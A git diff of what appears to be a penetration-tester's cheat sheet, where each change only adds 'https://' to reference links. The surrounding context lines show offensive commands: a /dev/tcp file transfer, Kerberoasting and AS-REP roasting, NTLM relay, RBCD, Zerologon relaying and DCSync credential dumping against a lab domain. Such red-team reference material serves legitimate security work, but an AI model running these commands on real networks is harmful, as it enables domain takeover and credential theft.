@@ -15,7 +15,7 @@
 
 # Reverse Shells
 
-* [securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/](https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/)
+* [https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/](https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/)
 
 
 
@@ -126,17 +126,17 @@ $ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 
 ### pwncat
 
-* [github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
-* [securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
+* [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
+* [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
 
 
 
 
 ## Upgrade to PTY
 
-* [forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
-* [xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
-* [securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)
+* [https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
+* [https://xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
+* [https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -172,7 +172,7 @@ user@remote:$ export TERM=xterm
 
 ## Linux
 
-* [snovvcrash.github.io/2018/10/11/simple-http-servers.html](https://snovvcrash.github.io/2018/10/11/simple-http-servers.html)
+* [https://snovvcrash.github.io/2018/10/11/simple-http-servers.html](https://snovvcrash.github.io/2018/10/11/simple-http-servers.html)
 
 
 
@@ -183,7 +183,7 @@ user@remote:$ export TERM=xterm
 
 ### Base64
 
-* [github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)
+* [https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)
 
 Local file to base64:
 
@@ -228,7 +228,7 @@ www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
 
 ## Linux2Windows
 
-* [blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
+* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
 
 
 
@@ -325,7 +325,7 @@ msf > irb
 => "<DECRYPTED>"
 ```
 
-* [github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
+* [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
 
 
 
@@ -398,7 +398,7 @@ $ showmount -e 127.0.0.1
 $ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
-* [resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
+* [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
 
 
 
@@ -406,15 +406,15 @@ $ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
 
 # WSUS
 
-* [book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus)
+* [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus)
 
 
 
 
 ## WSUS HTTP (MitM)
 
-* [www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)
-* [www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
+* [https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)
+* [https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
 
 
 
@@ -437,7 +437,7 @@ HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
 
 ## WSUS Local Proxy (LPE)
 
-* [www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
+* [https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
 
 
 
@@ -445,7 +445,7 @@ HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
 
 # LDAP
 
-* [book.hacktricks.xyz/pentesting/pentesting-ldap](https://book.hacktricks.xyz/pentesting/pentesting-ldap)
+* [https://book.hacktricks.xyz/pentesting/pentesting-ldap](https://book.hacktricks.xyz/pentesting/pentesting-ldap)
 
 
 
@@ -506,7 +506,7 @@ $ cat ldapsearch.log | awk '{print $1}' | sort | uniq -c | sort -nr
 
 ## LDAPPER.py
 
-* [github.com/shellster/LDAPPER](https://github.com/shellster/LDAPPER)
+* [https://github.com/shellster/LDAPPER](https://github.com/shellster/LDAPPER)
 
 ```
 $ git clone https://github.com/shellster/LDAPPER
@@ -518,7 +518,7 @@ $ sudo python3 -m pip install -r requirements.txt
 
 ## windapsearch
 
-* [github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)
+* [https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)
 
 Enumerate all AD Computers:
 
@@ -531,14 +531,14 @@ Enumerate all AD Computers:
 
 ## ldapdomaindump
 
-* [github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
+* [https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
 
 
 
 
 ## ad-ldap-enum
 
-* [github.com/CroweCybersecurity/ad-ldap-enum](https://github.com/CroweCybersecurity/ad-ldap-enum)
+* [https://github.com/CroweCybersecurity/ad-ldap-enum](https://github.com/CroweCybersecurity/ad-ldap-enum)
 
 
 
@@ -578,7 +578,7 @@ PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
 ##### GetNPUsers.py
 
-* [vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)
+* [https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)
 
 ```
 $ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.log
@@ -589,8 +589,8 @@ $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out aspre
 
 #### Targeted
 
-* [github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
-* [github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
+* [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
+* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
 
 Given GenericWrite/GenericAll DACL rights over a target, we can modify most of the user’s attributes. We can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))
 
@@ -607,12 +607,12 @@ PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
 
 ### Kerberoasting
 
-* [www.harmj0y.net/blog/redteaming/kerberoasting-revisited/](https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/)
-* [www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/](http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
-* [www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
-* [github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)
-* [docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type](https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type)
-* [swarm.ptsecurity.com/kerberoasting-without-spns/](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
+* [https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/](https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/)
+* [http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/](http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
+* [https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
+* [https://github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)
+* [https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type](https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type)
+* [https://swarm.ptsecurity.com/kerberoasting-without-spns/](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
 
 Check `msDS-SupportedEncryptionTypes` attribute (if RC4 is enabled):
 
@@ -649,8 +649,8 @@ PowerView2 > Set-DomainObject -Identity snovvcrash -Clear serviceprincipalname
 
 ## ACL Abuse
 
-* [www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
-* [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 
 
 
@@ -753,9 +753,9 @@ $ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
 
 Add DCSync rights with aclpwn.py:
 
-* [github.com/fox-it/aclpwn.py](https://github.com/fox-it/aclpwn.py)
-* [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
-* [www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
+* [https://github.com/fox-it/aclpwn.py](https://github.com/fox-it/aclpwn.py)
+* [https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
+* [https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
 
 ```
 $ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
@@ -763,7 +763,7 @@ $ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -
 
 Add DCSync rights with ActiveDirectory module:
 
-* [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
+* [https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
 
 1. Получить ACL для корневого объекта (домен).
 2. Получить SID для аккаунта, которому нужно дать DCSync.
@@ -793,10 +793,10 @@ PS > Set-Acl -AclObject $acl "AD:DC=megacorp,DC=local"
 
 ## GPO Abuse
 
-* [www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
-* [pentestmag.com/gpo-abuse-you-cant-see-me/](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
-* [wald0.com/?p=179](https://wald0.com/?p=179)
-* [habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
+* [https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [https://pentestmag.com/gpo-abuse-you-cant-see-me/](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
+* [https://wald0.com/?p=179](https://wald0.com/?p=179)
+* [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
 
 
 
@@ -824,7 +824,7 @@ Note: if I list all OUs affected by this GPO with PowerView, there will be no do
 
 Check if computer settings are enabled for this GPO (and enable them if not):
 
-* [gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801](https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801)
+* [https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801](https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801)
 
 ```
 PS > Get-Gpo VULN.GPO.NAME
@@ -860,14 +860,14 @@ Cmd > GPRESULT /R
 
 ## Delegation Abuse
 
-* [www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations)
+* [https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations)
 
 
 
 ### Unconstrained
 
-* [adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)
-* [dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
+* [https://adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)
+* [https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
 
 ```
 PowerView3 > Get-DomainComputer -Unconstrained | select dnshostname,samaccountname,useraccountcontrol
@@ -876,9 +876,9 @@ PowerView3 > Get-DomainComputer -Unconstrained | select dnshostname,samaccountna
 
 ### Resource-Based Constrained Delegation (RBCD)
 
-* [shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
-* [www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
-* [sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/](https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/)
+* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+* [https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
+* [https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/](https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/)
 
 
 #### RBCD from Windows
@@ -990,7 +990,7 @@ $ ...DCSync...
 
 ##### rbcd-attack
 
-* [github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
+* [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
 
 Configure RBCD on the vulnerable host (DC01):
 
@@ -1000,7 +1000,7 @@ $ ./rbcd.py -f fakemachine1337 -t DC01 -dc-ip 10.10.13.37 megacorp.local/snovvcr
 
 ##### rbcd_permissions
 
-* [github.com/NinjaStyle82/rbcd_permissions](https://github.com/NinjaStyle82/rbcd_permissions)
+* [https://github.com/NinjaStyle82/rbcd_permissions](https://github.com/NinjaStyle82/rbcd_permissions)
 
 Configure RBCD on the vulnerable host (DC01) via PtH:
 
@@ -1012,9 +1012,9 @@ $ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.
 
 **CVE-2020-17049**
 
-* [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
-* [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
-* [gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)
+* [https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
+* [https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
+* [https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)
 
 ```
 PS > Get-KerberosAESKey -Password 'Passw0rd!' -Salt MEGACORP.LOCALfakemachine1337
@@ -1032,10 +1032,10 @@ $ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.1
 
 #### DHCPv6 + WPAD + NTLM Relay + RBCD
 
-* [dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
-* [chryzsh.github.io/relaying-delegation/](https://chryzsh.github.io/relaying-delegation/)
-* [habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
-* [www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
+* [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+* [https://chryzsh.github.io/relaying-delegation/](https://chryzsh.github.io/relaying-delegation/)
+* [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
+* [https://www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
 
 ```
 $ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
@@ -1047,25 +1047,25 @@ $ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
 
 ## User Hunt
 
-* [www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
-* [www.slideshare.net/harmj0y/i-hunt-sys-admins-20](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
+* [http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
+* [https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
 
 
 
 ### Sessions Enum
 
-* [www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/](http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/)
-* [www.harmj0y.net/blog/powershell/powerquinsta/](http://www.harmj0y.net/blog/powershell/powerquinsta/)
+* [http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/](http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/)
+* [http://www.harmj0y.net/blog/powershell/powerquinsta/](http://www.harmj0y.net/blog/powershell/powerquinsta/)
 
 
 
 ### Derivative Local Admins
 
-* [www.harmj0y.net/blog/redteaming/local-group-enumeration/](http://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
-* [medium.com/@sixdub/derivative-local-admin-cdd09445aac8](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
-* [wald0.com/?p=14](https://wald0.com/?p=14)
-* [www.offensiveops.io/tools/bloodhound-working-with-results/](http://www.offensiveops.io/tools/bloodhound-working-with-results/)
-* [www.varonis.com/blog/powerview-for-penetration-testing/](https://www.varonis.com/blog/powerview-for-penetration-testing/)
+* [http://www.harmj0y.net/blog/redteaming/local-group-enumeration/](http://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
+* [https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
+* [https://wald0.com/?p=14](https://wald0.com/?p=14)
+* [http://www.offensiveops.io/tools/bloodhound-working-with-results/](http://www.offensiveops.io/tools/bloodhound-working-with-results/)
+* [https://www.varonis.com/blog/powerview-for-penetration-testing/](https://www.varonis.com/blog/powerview-for-penetration-testing/)
 
 
 
@@ -1074,14 +1074,14 @@ $ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
 
 **CVE-2019-0686, CVE-2019-0724**
 
-* [github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
-* [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+* [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
+* [https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 
 
 
 ### Check
 
-* [twitter.com/\_wald0/status/1091062691383238656](https://twitter.com/_wald0/status/1091062691383238656)
+* [https://twitter.com/\_wald0/status/1091062691383238656](https://twitter.com/_wald0/status/1091062691383238656)
 
 ```
 $ sudo ./Responder.py -I eth0 -Av
@@ -1104,14 +1104,14 @@ $ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.3
 
 **CVE-2020-1472**
 
-* [www.secura.com/uploads/whitepapers/Zerologon.pdf](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
-* [twitter.com/\_dirkjan/status/1306280566313156608](https://twitter.com/_dirkjan/status/1306280566313156608)
+* [https://www.secura.com/uploads/whitepapers/Zerologon.pdf](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
+* [https://twitter.com/\_dirkjan/status/1306280566313156608](https://twitter.com/_dirkjan/status/1306280566313156608)
 
 
 
 ### Check
 
-* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+* [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
 
 ```
 $ ./zerologon_tester.py DC01 10.10.13.38
@@ -1121,12 +1121,12 @@ $ ./zerologon_tester.py DC01 10.10.13.38
 
 ### Exploit
 
-* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
-* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
+* [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+* [https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
 
 Exploits above **will break the domain!** Use this technique by @dirkjanm to abuse Zerologon safely:
 
-* [dirkjanm.io/a-different-way-of-abusing-zerologon/](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
+* [https://dirkjanm.io/a-different-way-of-abusing-zerologon/](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
 
 ```
 $ sudo ntlmrelayx.py -t dcsync://DC01.megacorp.local -smb2support
@@ -1138,10 +1138,10 @@ $ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC02.
 
 ## DnsAdmins
 
-* [medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
-* [www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
-* [ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
-* [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
+* [https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
+* [http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+* [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
 
 
 
@@ -1172,8 +1172,8 @@ PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 
 ### ADSync
 
-* [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
-* [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+* [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
+* [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
 
 ```
 PS > Azure-ADConnect -server 127.0.0.1 -db ADSync
@@ -1221,7 +1221,7 @@ mimikatz # lsadump::dcsync /domain:megacorp.local /user:krbtgt@megacorp.local
 
 ### Invoke-DCSync.ps1
 
-* [github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1)
+* [https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1)
 
 ```
 PS > Invoke-DCSync -GetComputers -Domain megacorp.local -DomainController DC01.megacorp.local
@@ -1239,10 +1239,10 @@ $ secretsdump.py DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\
 
 ## Attack Trusts
 
-* [www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
-* [www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/](http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/)
-* [www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
-* [habr.com/ru/company/jetinfosystems/blog/466445/](https://habr.com/ru/company/jetinfosystems/blog/466445/)
